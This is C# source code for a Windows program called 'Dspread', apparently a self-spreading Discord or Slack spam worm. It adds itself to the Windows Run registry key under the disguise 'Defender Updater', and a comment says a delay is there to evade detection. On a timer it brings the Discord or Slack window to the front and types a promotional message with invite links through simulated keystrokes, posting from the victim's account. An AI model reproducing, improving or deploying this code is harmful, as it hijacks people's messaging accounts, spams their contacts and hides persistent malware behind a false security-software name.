using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Dspread
{
    static class Program
    {
        [DllImport("User32.dll")]
        private static extern bool SetForegroundWindow(IntPtr handle);
        [DllImport("User32.dll")]
        private static extern bool ShowWindow(IntPtr handle, int nCmdShow);
        [DllImport("User32.dll")]
        private static extern bool IsIconic(IntPtr handle);

        const int SW_RESTORE = 9;

        [STAThread]
        static void Main(string[] args)
        {

            string message;
            if (args.Length == 0)
                message = "** **";
            else
                message = args[0];
            int delay = 60;

            if (args.Length > 1)
                int.TryParse(args[1], out delay);

            int messages = 0;

            int calcDelay = delay;

            var stopwatch = new Stopwatch();

            message = "This message was sent by Dspread! \n https://github.com/spuqe \n https://discord.gg/yMtaYr8cyP"; // MESSAGE YOU WANT TO SEND HERE
            // Define startup
            void Startup()
            {
                System.Threading.Thread.Sleep(69); // Waits before adding to startup to prevent detections.
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.SetValue("Defender Updater", Application.ExecutablePath);
            }

            var timer = new System.Timers.Timer(1000);
            timer.Elapsed += (t, a) =>
            {
                timer.Interval = delay * 1500; // Speed (recommended +1000 to prevent spam and shit)
                stopwatch.Restart();
                Process[] processes = Process.GetProcessesByName("discord"); // Or change the "discord" to Slack or Slac if you're using slack!
                if (processes.Length == 0)
                {
                    Environment.Exit(Environment.ExitCode);
                }

                // Makes Discord or Slack active window 
                foreach (Process proc in processes)
                {
                    proc.Refresh();
                    if (IsIconic(proc.MainWindowHandle))
                    {
                        ShowWindow(proc.MainWindowHandle, SW_RESTORE);
                    }
                    SetForegroundWindow(proc.MainWindowHandle);
                }

                SendKeys.SendWait(message + "{ENTER}");
                messages++;

                calcDelay = delay;
            };
            timer.Start();

            // Add application to startup
            while (true)
            {
                Startup();
            }
        }
    }
}